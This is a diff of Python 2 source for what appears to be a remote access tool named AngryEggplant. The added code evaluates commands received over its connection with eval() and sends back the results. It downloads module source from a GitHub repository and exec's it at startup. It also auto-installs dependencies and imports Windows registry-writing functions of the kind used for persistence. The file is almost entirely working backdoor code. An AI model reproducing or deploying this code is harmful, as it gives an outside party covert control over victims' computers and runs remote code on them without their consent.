-    while True:
-        try:
-            configured = configure()
-            while configured:
-                try:
-                    updated = update()
-                    while updated:
+                    if not len(result) or 'not recognized' in result:
                         try:
-                            e = Eggplant(debug=True)                
-                            e.run(e.socket)
-                        except Exception as e1:
-                            print 'Error: %s Reconnecting in 10...' % str(e1)     
-                            sleep(10)
-                except Exception as e2:
-                    print 'Error: %s Re-loading modules in 10...' % str(e2)
-                    sleep(10)
-        except Exception as e3:
-            print 'Error: %s re-configuring in 10...' % str(e3)
-            sleep(10) 
-    
-    
-        
+                            result = eval(data)
+                        except Exception as ev:
+                            result = "Evaluating code '{}' returned error: {}".format(str(data), str(ev))
+
+                if result:
+                    self._send(result, method=cmd)
 
 
 if __name__ == '__main__':
-    main()
+
+    module_info    = [item for item in get('https://api.github.com/repos/colental/AngryEggplant/contents/modules').json() if item['name'] not in globals() if '__' not in item]
+    dependencies   = {}
+    dependencies['AES']                = 'Crypto.Cipher'
+    dependencies['HMAC']               = 'Crypto.Hash'
+    dependencies['SHA256']             = 'Crypto.Hash'
+    dependencies['bytes_to_long']      = 'Crypto.Util.number'
+    dependencies['long_to_bytes']      = 'Crypto.Util.number'                        
+    dependencies['ShellExecuteEx']     = 'win32com.shell.shell' if os.name is 'nt' else None
+    dependencies['HKEY_CURRENT_USER']  = '_winreg' if os.name is 'nt' else None
+    dependencies['KEY_WRITE']          = '_winreg' if os.name is 'nt' else None
+    dependencies['KEY_ALL_ACCESS']     = '_winreg' if os.name is 'nt' else None
+    dependencies['REG_SZ']             = '_winreg' if os.name is 'nt' else None
+    dependencies['CloseKey']           = '_winreg' if os.name is 'nt' else None
+    dependencies['DeleteValue']        = '_winreg' if os.name is 'nt' else None
+    dependencies['OpenKey']            = '_winreg' if os.name is 'nt' else None
+    dependencies['SetValueEx']         = '_winreg' if os.name is 'nt' else None
+
+    for module in dependencies:
+        try:
+            package = dependencies[module]
+            if module not in globals():
+                try:
+                    exec "from %s import %s" % (package, module)
+                except:
+                    try:
+                        main_package = package.split('.')[0]
+                        install = pip.InstallCommand().main([main_package])
+                        exec "from %s import %s" % (package, module)
+                    except Exception as x:
+                        pass
+        except Exception as e:
+            pass
+
+    for item in module_info:
+        name, _ = os.path.splitext(item['name'])
+        if '__' not in name:
+            try:
+                code = get(item['download_url']).text.encode()       
+                mod  = new_module(name)
+                exec code in mod.__dict__
+                globals()[name] = mod
+            except Exception as e:
+                pass
+          
+
+    e = Eggplant(debug=True)
+    e.run()
